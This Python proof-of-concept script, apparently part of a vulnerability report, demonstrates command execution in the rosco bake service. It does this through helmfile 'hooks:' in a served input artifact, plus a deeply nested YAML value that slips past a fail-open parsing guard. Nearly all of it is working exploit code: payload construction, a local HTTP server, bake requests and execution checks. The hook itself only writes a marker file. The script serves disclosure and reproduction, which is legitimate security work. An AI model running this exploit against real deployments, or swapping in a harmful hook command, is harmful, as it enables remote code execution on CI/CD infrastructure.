#!/usr/bin/env python3
"""Proof of concept: command execution on a rosco pod via a baked helmfile.

Demonstrates that `hooks:` in a caller-supplied input artifact executes as the rosco
process during `helmfile template`, and that a shipped guard which fails open on
unparseable YAML does not stop it.

    AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H   CWE-78 / CWE-693

Inertness
---------
The hook's only behaviour is to write a marker file into **rosco's own** `/tmp` and print
the process identity. There is no reverse shell, no outbound callback, no credential
access, no persistence, and nothing that survives the bake. The marker is removed by
this script after it has been read.

Exit status
-----------
0   the vulnerability reproduced (the marker appeared)
1   usage error, or rosco unreachable
2   did not reproduce, and the reason was the guard rejecting the request
3   did not reproduce for an inconclusive reason -- see PITFALLS

The script runs a control and a payload. The control is a parseable helmfile carrying the
same `hooks:` block; the payload is byte-identical except for one value nested past
SnakeYAML's 50-level limit. Reading the two responses together tells you which build you
are on:

    build                          control   payload
    <= 2026.3.0 (no guard)         executes  executes
    2026-09-19 main-latest (#8015) rejected  executes   <- the guard is incomplete
    rosco-2026.3.1 (hardened)      rejected  rejected   <- fixed
"""

import argparse
import http.server
import json
import os
import shutil
import socketserver
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request

BAKE_PATH = "/api/v2/manifest/bake/HELMFILE"

# SnakeYAML's default nestingDepthLimit in the rosco guard.
GUARD_DEPTH_LIMIT = 50


def build_deep_value(depth: int) -> str:
    """A YAML block nested `depth` levels past the document root."""
    pad = "  " * depth
    out = ["deep:"]
    for i in range(depth):
        out.append(f"{pad}{'  ' * i}n{i}:")
    out.append(f"{pad}{'  ' * depth}leaf: x")
    return "\n".join(out) + "\n"


def helmfile_with_hook(extra: str = "") -> bytes:
    """A helmfile whose only behaviour is writing a marker into rosco's own /tmp."""
    return (
        "hooks:\n"
        '  - events: ["prepare"]\n'
        '    command: "sh"\n'
        '    args: ["-c", '
        '"id > /tmp/rosco-poc-marker.txt; '
        "pwd >> /tmp/rosco-poc-marker.txt; "
        "date >> /tmp/rosco-poc-marker.txt\"]\n"
        + extra
    ).encode("utf-8")


class _Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *args):  # keep stdout parseable
        pass


def serve(payloads: dict) -> tuple:
    """Serve the helmfile bodies; returns (port, reachable_base, shutdown)."""
    os.makedirs("rosco-poc-served", exist_ok=True)
    for name, body in payloads.items():
        with open(os.path.join("rosco-poc-served", name), "wb") as fh:
            fh.write(body)

    class Handler(_Quiet):
        def __init__(self, *a, **kw):
            super().__init__(*a, directory="rosco-poc-served", **kw)

    socketserver.TCPServer.allow_reuse_address = True
    httpd = socketserver.TCPServer(("0.0.0.0", 0), Handler)
    port = httpd.server_address[1]
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    return port, f"http://host.docker.internal:{port}", httpd.shutdown


def bake(base: str, artifact_url: str) -> tuple:
    """POST one bake request. Returns (status, body_snippet)."""
    body = json.dumps(
        {
            "templateRenderer": "HELMFILE",
            "outputName": "rosco-poc-manifests",
            "outputArtifactName": "rosco-poc-manifests",
            "namespace": "default",
            "inputArtifacts": [
                {
                    "type": "http/file",
                    "name": "rosco-poc-entry",
                    "reference": artifact_url,
                    "artifactAccount": "no-auth-http-account",
                }
            ],
        }
    ).encode()
    req = urllib.request.Request(
        base.rstrip("/") + BAKE_PATH,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            return resp.status, resp.read(400).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(400).decode("utf-8", "replace")


def in_rosco(container: str, argv: list) -> tuple:
    """Run a command inside the rosco container."""
    try:
        p = subprocess.run(
            ["docker", "exec", container] + argv,
            capture_output=True,
            timeout=30,
        )
    except FileNotFoundError:
        print("  ! docker not found; cannot verify the marker", file=sys.stderr)
        return 127, ""
    return p.returncode, p.stdout.decode("utf-8", "replace").strip()


def marker_present(container: str, marker: str) -> bool:
    rc, _ = in_rosco(container, ["test", "-f", f"/tmp/{marker}"])
    return rc == 0


def read_marker(container: str, marker: str) -> str:
    _, out = in_rosco(container, ["cat", f"/tmp/{marker}"])
    return out


def main() -> int:
    ap = argparse.ArgumentParser(
        description="rosco helmfile hooks/postRenderers command execution"
    )
    ap.add_argument(
        "--base",
        required=True,
        help="rosco base URL as reachable from this host, e.g. http://localhost:18087",
    )
    ap.add_argument(
        "--container",
        required=True,
        help="rosco container name, used to read the marker from inside the pod",
    )
    ap.add_argument(
        "--artifact-host",
        default="host.docker.internal",
        help="host by which rosco reaches this machine (default: %(default)s)",
    )
    ap.add_argument("--marker", default="rosco-poc-marker.txt")
    ap.add_argument(
        "--confirm-authorised",
        action="store_true",
        help="required: confirms you are authorised to run this against the target",
    )
    args = ap.parse_args()

    if not args.confirm_authorised:
        print(__doc__.strip().splitlines()[0], file=sys.stderr)
        print(
            "\nrefusing to run: this sends a payload that executes a command on the "
            "target.\nre-run with --confirm-authorised if that target is one you own "
            "or are authorised to test.",
            file=sys.stderr,
        )
        return 1

    payloads = {
        "control.yaml": helmfile_with_hook(),
        "payload.yaml": helmfile_with_hook(
            extra=build_deep_value(GUARD_DEPTH_LIMIT + 12)
        ),
    }

    port, _default_base, shutdown = serve(payloads)
    artifact_base = f"http://{args.artifact_host}:{port}"
    print(f"serving payloads on {artifact_base} (local port {port})")

    try:
        # Clean slate, so a stale marker cannot be mistaken for a fresh execution.
        in_rosco(args.container, ["rm", "-f", f"/tmp/{args.marker}"])

        results = {}
        for label, name in (("control", "control.yaml"), ("payload", "payload.yaml")):
            status, snippet = bake(args.base, f"{artifact_base}/{name}")
            # helmfile exits 3 on a payload with no renderable release, and the hook has
            # already run by then. Give the pod a moment before looking for the marker.
            for _ in range(10):
                if marker_present(args.container, args.marker):
                    break
                time.sleep(0.5)
            results[label] = (status, marker_present(args.container, args.marker))
            print(f"\n=== {label} ===")
            print(f"HTTP={status}")
            print(f"  {snippet[:240]}")
            print(f"  marker present: {results[label][1]}")
            in_rosco(args.container, ["rm", "-f", f"/tmp/{args.marker}"])
    finally:
        shutdown()
        shutil.rmtree("rosco-poc-served", ignore_errors=True)

    print("\n=== result ===")
    for label in ("control", "payload"):
        status, hit = results[label]
        verdict = "EXECUTED" if hit else ("rejected" if status == 400 else "no marker")
        print(f"  {label:<8} HTTP={status:<4} {verdict}")

    if results["payload"][1]:
        print("\n[!!] VULNERABLE - the payload hook executed as the rosco process:")
        for line in read_marker(args.container, args.marker).splitlines():
            print(f"      {line}")
        return 0

    if results["control"][1]:
        print(
            "\n[!!] VULNERABLE - no guard is present; even the parseable control executed."
        )
        return 0

    if results["payload"][0] == 400 or results["control"][0] == 400:
        print(
            "\n[ok] NOT REPRODUCED - the guard rejected the request.\n"
            "     This build is not affected. Compare against the table in the PoC\n"
            "     docstring if you expected the pre-2026-09-19 behaviour."
        )
        return 2

    print(
        "\n[?] INCONCLUSIVE - no marker, and no guard rejection either.\n"
        "    Check the pitfalls in report.md section 5: artifact type must be\n"
        "    http/file, --helm-binary must be helm3, the marker is only visible\n"
        "    from inside the rosco container, and a 202 from gate does not mean\n"
        "    orca accepted the trigger."
    )
    return 3


if __name__ == "__main__":
    sys.exit(main())
